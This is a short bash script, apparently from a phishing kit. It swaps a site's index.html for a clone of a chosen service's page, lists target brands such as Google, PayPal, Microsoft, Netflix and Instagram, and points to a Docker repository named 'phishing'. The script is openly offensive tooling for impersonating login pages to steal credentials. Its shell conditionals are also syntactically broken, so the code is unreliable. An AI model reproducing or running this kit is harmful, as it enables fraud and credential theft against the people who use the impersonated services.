# usage bash chaneg.sh <servicename>[instagram, snapchat , default etc]
git pull
if [-f $1.html]
    then 
        cp $1.html index.html
        echo "dont changing main site to $1" 
fi

if [! -f $1.html]
    then 
        cp default.html index.html
        echo "ERROR 404 $1 not found "
fi

echo 
echo 
echo "------------------"
echo "use default for using the default site"
echo "All options are " 
echo google
echo instagram
echo facebook 
echo linkedin
echo microsoft 
echo netflix
echo spotify 
echo paypal
echo twitter
echo instafollowers
echo snapchat 
echo "more comming soon stay updated at https://hub.docker.com/repository/docker/insomniaccoder/phishing"
